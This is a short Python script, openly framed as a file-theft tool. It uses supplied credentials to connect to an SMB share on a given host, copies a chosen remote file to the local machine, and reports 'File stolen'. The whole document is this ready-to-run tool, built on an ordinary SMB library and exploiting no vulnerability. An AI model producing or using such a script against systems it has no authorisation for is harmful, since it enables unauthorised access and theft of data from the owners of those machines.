import sys
from smb.SMBConnection import SMBConnection

def steal_files(host, username, password, share, remote_path, local_path):
    conn = SMBConnection(username, password, 'loki', host, use_ntlm_v2=True)
    conn.connect(host, 139)
    with open(local_path, 'wb') as f:
        conn.retrieveFile(share, remote_path, f)
    conn.close()
    print(f"File stolen: {remote_path} -> {local_path}")

if __name__ == "__main__":
    host = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    share = sys.argv[4]
    remote_path = sys.argv[5]
    local_path = sys.argv[6]
    steal_files(host, username, password, share, remote_path, local_path)
